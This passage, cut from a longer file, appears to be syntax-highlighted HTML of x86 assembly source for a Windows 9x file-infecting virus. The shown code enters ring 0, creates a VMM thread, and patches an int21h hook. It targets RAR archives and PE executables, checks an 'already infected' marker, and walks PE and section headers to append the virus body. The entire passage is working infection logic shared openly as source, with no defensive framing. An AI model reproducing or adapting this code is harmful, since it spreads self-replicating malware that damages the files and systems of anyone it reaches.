</span><span class="sc5">infct2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">semaphore</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">;set semaphore</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ipatch</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">9090h</span><span class="sc0">  </span><span class="sc1">;patch int21h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                            </span><span class="sc1">;ECX=0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                               </span><span class="sc1">;CL=r0_patch</span><span class="sc0">
</span><span class="sc5">r0_patch</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                       </span><span class="sc1">;ring0 procedure is called</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">LeaveRing0</span><span class="sc0">                        </span><span class="sc1">;only once</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">EnterRing0</span><span class="sc0">                         </span><span class="sc1">;EnTeRrInG0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  </span><span class="sc1">;Now we will create new</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">callback</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;VMM thread</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                </span><span class="sc1">;callback function</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'tA92'</span><span class="sc0">                             </span><span class="sc1">;thread type</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                </span><span class="sc1">;ES</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                </span><span class="sc1">;DS</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Thread</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;EIP</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                </span><span class="sc1">;...</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;CS</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">threadstack</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;ESP</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                </span><span class="sc1">;...</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                </span><span class="sc1">;SS</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">                                 </span><span class="sc1">;VMMCall</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00010105h</span><span class="sc0">                            </span><span class="sc1">;VMMCreateThread</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">24h</span><span class="sc0">                           </span><span class="sc1">;correct stack</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">r0_patch</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;patch</span><span class="sc0">
        </span><span class="sc6">iretd</span><span class="sc0">                                   </span><span class="sc1">;return from INT</span><span class="sc0">

</span><span class="sc5">LeaveRing0</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">check_name</span><span class="sc0">                         </span><span class="sc1">;check filename</span><span class="sc0">
</span><span class="sc1">;MODIFY ON YOUR OWN RISC!</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">exit_infection</span><span class="sc0">                       </span><span class="sc1">;error?</span><span class="sc0">
</span><span class="sc1">;       jmp exit_infection</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">tmpext</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;save extension</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7143h</span><span class="sc0">                          </span><span class="sc1">;LFN retrieve</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                            </span><span class="sc1">;attributes</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">exit_infection</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">file_attr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">    </span><span class="sc1">;save them</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7143h</span><span class="sc0">                          </span><span class="sc1">;LFN set attributes</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                             </span><span class="sc1">;set them</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">exit_infection</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7143h</span><span class="sc0">                          </span><span class="sc1">;LFN retrieve time/date</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">exit_infection</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">file_time</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">    </span><span class="sc1">;save it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">file_date</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">716ch</span><span class="sc0">                          </span><span class="sc1">;LFN extended Create/</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                            </span><span class="sc1">;/Open file</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                            </span><span class="sc1">;ECX=0</span><span class="sc0">
        </span><span class="sc6">cdq</span><span class="sc0">                                     </span><span class="sc1">;EDX=0</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                 </span><span class="sc1">;EDX=1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                             </span><span class="sc1">;open file for R/W</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">exit_infection</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678</span><span class="sc0">                       </span><span class="sc1">;get extension</span><span class="sc0">
</span><span class="sc5">tmpext</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'R'</span><span class="sc0">                             </span><span class="sc1">;is it ".RAR" ?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">try_RAR</span><span class="sc0">                              </span><span class="sc1">;yeah, infect RAR</span><span class="sc0">

</span><span class="sc1">;Now we will test for Pentium+ processor</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">                                  </span><span class="sc1">;save all regs</span><span class="sc0">
        </span><span class="sc6">pushfd</span><span class="sc0">                                  </span><span class="sc1">;save EFLAGS</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;get them</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;save them</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">200000h</span><span class="sc0">                         </span><span class="sc1">;flip ID bit in EFLAGS</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;store</span><span class="sc0">
        </span><span class="sc6">popfd</span><span class="sc0">                                   </span><span class="sc1">;flags</span><span class="sc0">
        </span><span class="sc6">pushfd</span><span class="sc0">                                  </span><span class="sc1">;get them back</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;...</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                            </span><span class="sc1">;same?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_cc</span><span class="sc0">                               </span><span class="sc1">;shit, we r on 486-</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;EAX=0</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;EAX=1</span><span class="sc0">
        </span><span class="sc6">cpuid</span><span class="sc0">                                   </span><span class="sc1">;CPUID</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">111100000000b</span><span class="sc0">                  </span><span class="sc1">;mask processor family</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                               </span><span class="sc1">;is it 486?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_cc</span><span class="sc0">                               </span><span class="sc1">;baaaaaaad</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">                                   </span><span class="sc1">;no, Pentium installed</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">v_state</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">BG_INFECTINEXEC</span><span class="sc0"> </span><span class="sc1">;set state</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_DOS_HEADER</span><span class="sc0">            </span><span class="sc1">;MZ header</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read_something</span><span class="sc0">                     </span><span class="sc1">;read it</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">IMAGE_DOS_SIGNATURE</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">                          </span><span class="sc1">;is it really MZ header?</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">header.MZ_res2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">29ah</span><span class="sc0">
</span><span class="sc5">bg_sig</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                         </span><span class="sc1">;already infected?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek_eof</span><span class="sc0">                           </span><span class="sc1">;get file size</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">fsize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;save it</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">                          </span><span class="sc1">;is it smaller than</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">                           </span><span class="sc1">;4096 bytes?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">400000h</span><span class="sc0">                              
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;too large?</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">header.MZ_lfanew</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;get ptr to PE header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MZlfanew</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">     </span><span class="sc1">;save it</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                            </span><span class="sc1">;points inside file?</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">                          </span><span class="sc1">;no, invalid ptr</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek_here</span><span class="sc0">                          </span><span class="sc1">;seek to MZ_lfanew</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">IMAGE_SIZEOF_FILE_HEADER</span><span class="sc4">+</span><span class="sc5">IMAGE_SIZEOF_NT_OPTIONAL_HEADER</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read_something</span><span class="sc0">                     </span><span class="sc1">;read whole PE header</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">IMAGE_NT_SIGNATURE</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">                          </span><span class="sc1">;is it PE\0\0?</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">header.NT_FileHeader.FH_Machine</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">],</span><span class="sc0"> \
                </span><span class="sc5">IMAGE_FILE_MACHINE_I386</span><span class="sc0">         </span><span class="sc1">;must i386 compatible</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">header.NT_FileHeader.FH_Characteristics</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_EXECUTABLE_IMAGE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_DLL</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">                          </span><span class="sc1">;must be EXEC, mustnt be DLL</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">header.NT_OptionalHeader.OH_ImageBase</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">400000h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">                          </span><span class="sc1">;must be 400000h</span><span class="sc0">

        </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">header.NT_FileHeader.FH_SizeOfOptionalHeader</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">header.NT_FileHeader.FH_NumberOfSections</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">   </span><span class="sc1">;ptr to last section</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">MZlfanew</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">IMAGE_SIZEOF_FILE_HEADER</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">sh_pos</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek_here</span><span class="sc0">                          </span><span class="sc1">;seek to last section header</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">section_header</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">r_something</span><span class="sc0">                        </span><span class="sc1">;read last section header</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virtual_end</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">              </span><span class="sc1">;size of file in memory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">section_header.SH_SizeOfRawData</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">]</span><span class="sc0">
